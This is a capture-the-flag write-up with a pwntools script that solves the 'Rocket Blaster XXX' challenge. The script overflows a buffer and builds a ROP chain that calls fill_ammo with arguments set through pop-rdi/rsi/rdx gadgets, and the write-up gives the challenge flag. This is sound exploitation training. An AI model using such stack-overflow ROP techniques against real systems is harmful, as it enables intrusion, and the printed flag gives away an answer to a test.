# Rocket Blaster XXX

## Solution
ROP chain challenge where you need to follow proper x64 calling conventions such that the function will look like `fill_ammo(0xdeadbeef, 0xdeadbabe, 0xdead1337)`. This requires that:
- `rdi` => `0xdeadbeef`
- `rsi` => `0xdeadbabe`
- `rdx` => `0xdead1337`
## Solve Script
``` python
from pwn import *
from ctfkit.bp import *

context.binary = 'rocket_blaster_xxx'
context.log_level = 'error'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

# gadgets
g_pop_rdi = 0x40159f
g_pop_rsi = 0x40159d
g_pop_rdx = 0x40159b
g_ret = 0x40101a

# functions
f_fill_ammo = 0x4012f5

def main():
  proc = get_process()

  # call fill_ammo(0xdeadbeef, 0xdeadbabe, 0xdead1337)
  payload = b''.join([
    b'A'*0x28,
    p64(g_pop_rdi),
    p64(0xdeadbeef),
    p64(g_pop_rsi),
    p64(0xdeadbabe),
    p64(g_pop_rdx),
    p64(0xdead1337),
    p64(g_ret), # used for stack alignment
    p64(f_fill_ammo)
  ])

  proc.sendlineafter(b'>> ', payload)
  proc.interactive()

if __name__ == '__main__':
  parse_args()
  main()
```

Flag: HTB{b00m_b00m_r0ck3t_2_th3_m00n}